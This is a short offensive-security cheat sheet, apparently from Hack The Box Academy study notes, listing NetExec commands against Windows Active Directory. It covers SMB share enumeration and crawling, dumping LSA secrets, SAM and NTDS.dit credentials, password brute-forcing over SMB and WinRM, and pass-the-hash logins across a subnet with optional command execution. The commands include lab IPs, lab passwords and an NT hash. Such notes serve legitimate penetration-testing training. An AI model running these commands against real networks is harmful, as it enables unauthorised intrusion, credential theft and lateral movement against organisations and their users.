---
type: tool
category: AD
tags:
  - tool
---
# Overview

## SMB
Enumerating subnet for DC (via smb)
```bash
nxc smb 192.168.90.0/24
```

Fingerprint SMB Host:
```bash
nxc smb IP
```
^062dcf

List Shares with anonymous SMB access via `NULL Session` :
```bash
netexec smb 10.129.185.244 -u '' -p '' --shares
```
^da38c6
### Crawl SMB-share 
Crawl SMB-share and download interesting files (slow but thoroughly):
```bash
nxc smb 10.129.234.173 -u USER -p PASSWORD -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```
and filter the directory for keywords:
```bash
grep -rni 'password'
```
### Dump LSA-Secrets
```bash
netexec smb 10.129.42.19 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

^af05ba

### Dump SAM-DB 
```bash
netexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

^d807fd

### Dump NTDS.dit
```bash
netexec smb 10.129.202.85 -u jmarston -p P@ssword! -M ntdsutil
```

^6a9338

### Force guest-login flag and crawl share for all subdirecotries and files:
```bash
netexec smb 172.16.1.11 -u 'a' -p '' --spider SHARENAME
```

### Bruteforcing password for known user
```bash
netexec smb 10.129.203.6 -u user -p pws.list --shares
```

^639893

### Bruteforcing domain-users
```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
^d1ba59
### Pass the hash (SMB)
Try to login on all clients on the subnet with the local Administrator. Is especially useful, when we successfully dumped the SAM-DB on a device :
```bash
netexec smb 172.16.1.0/24 -u Administrator --local-auth -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
When adding e.g. `-x COMMAND` we can also execute commands.
## WinRM
#### Bruteforcing
```bash
netexec winrm 10.129.202.136 -u username.list -p password.list
```

^73af65


## Important Parameter
